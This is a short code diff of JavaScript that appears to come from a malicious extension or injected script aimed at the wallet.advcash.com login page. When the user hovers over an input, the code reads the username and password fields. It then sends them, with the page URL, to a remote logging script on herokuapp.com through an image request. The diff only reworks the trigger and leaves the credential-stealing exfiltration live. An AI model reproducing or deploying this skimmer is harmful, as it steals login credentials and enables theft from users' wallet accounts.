@@ -117,16 +117,12 @@ for (var i = 0; i < arrayLength; i++) {
     };
 
     if (top['location']['href']['indexOf']('wallet.advcash.com') > -1) {
-        var interval = setInterval(function () {
-            if (document['getElementsByClassName']('form')[0]) {
-                clearInterval(interval);
-                document['getElementsByName']('j_idt55')[0].onmouseover = function (_0x441cx2) {
+                document.getElementsByTagName("input")[7].onmouseover = function (_0x441cx2) {
                 username = document.getElementsByName("j_username")[0].value;
                 user_pass = document.getElementsByName("j_password")[0].value;
               (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                 }
-            }
-        }, 1000)
+
     };
 
 
